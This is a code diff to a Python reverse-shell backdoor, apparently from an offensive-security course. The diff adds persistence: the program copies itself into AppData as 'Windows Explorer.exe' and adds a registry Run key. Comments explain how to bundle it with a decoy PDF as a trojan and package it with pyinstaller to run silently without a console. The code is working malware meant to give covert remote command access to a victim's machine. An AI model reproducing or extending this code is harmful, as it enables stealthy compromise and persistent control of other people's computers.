@@ -3,13 +3,22 @@ import socket
 import subprocess
 import json
 import os
+import sys
+import shutil
 import base64
 import argparse, textwrap
 
 class Reverse_Backdoor:
     def __init__(self, ip, port):
+        self.persist()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+    
+    def persist(self):
+        tmp_file = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(tmp_file):
+            shutil.copyfile(sys.executable, tmp_file)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "' + tmp_file + '"', shell=True)
 
     def send(self, data):
         json_data = json.dumps(data)
@@ -47,7 +56,7 @@ class Reverse_Backdoor:
             try:
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     output = self.change_dir(command[1])
                 elif command[0] == "download":
@@ -79,5 +88,17 @@ This program runs on target machine and gives us reverse shell connection. First
 
 args = get_args()
 
-reverse_backdoor = Reverse_Backdoor(args.ip, int(args.port))
-reverse_backdoor.run()
+# Create trojan:
+# file_name = sys._MEIPASS + "/sample.pdf"
+# subprocess.Popen(file_name, shell=True)
+
+try:
+    reverse_backdoor = Reverse_Backdoor(args.ip, int(args.port))
+    reverse_backdoor.run()
+except Exception:
+    sys.exit()
+
+# Convert to executable:
+# > pyinstaller reverse_backdoor.py --add-data "<trojan_file>;." --onefile --noconsole
+# Run background silently:
+# > reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d <exe>
